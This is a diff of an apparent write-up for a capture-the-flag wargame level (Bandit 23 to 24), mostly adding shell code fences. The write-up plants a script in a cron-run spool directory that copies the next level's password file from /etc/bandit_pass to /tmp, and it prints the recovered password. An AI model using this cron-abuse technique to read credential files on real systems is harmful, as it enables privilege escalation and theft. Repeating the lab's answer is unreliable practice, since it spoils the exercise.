@@ -1,5 +1,6 @@
 Similar to last level. Let's read the script.
 
+```sh
 bandit23@bandit:~$ cd /etc/cron.d/
 bandit23@bandit:/etc/cron.d$ ls
 cronjob_bandit22  cronjob_bandit23  cronjob_bandit24  popularity-contest
@@ -22,23 +23,29 @@ do
 	rm -f ./$i
     fi
 done
-
-
+```
 
 Alright. First things first, let's go to where the script is executing all
 scripts.
 
+```sh
 bandit23@bandit:/etc/cron.d$ cd /var/spool/bandit24/
+```
 
 Now let's make a script.
 
+```sh
 bandit23@bandit:/etc/cron.d$ vim Ugohpei2.sh
 #!/bin/bash
 touch /tmp/iSheich6
 cat /etc/bandit_pass/bandit24 > /tmp/iSheich6
+```
 
 And run it and read it.
+
+```sh
 bandit23@bandit:/var/spool/bandit24$ /usr/bin/cronjob_bandit24.sh
 -snip-
 bandit23@bandit:/var/spool/bandit24$ cat /tmp/iSheich6
 UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+```
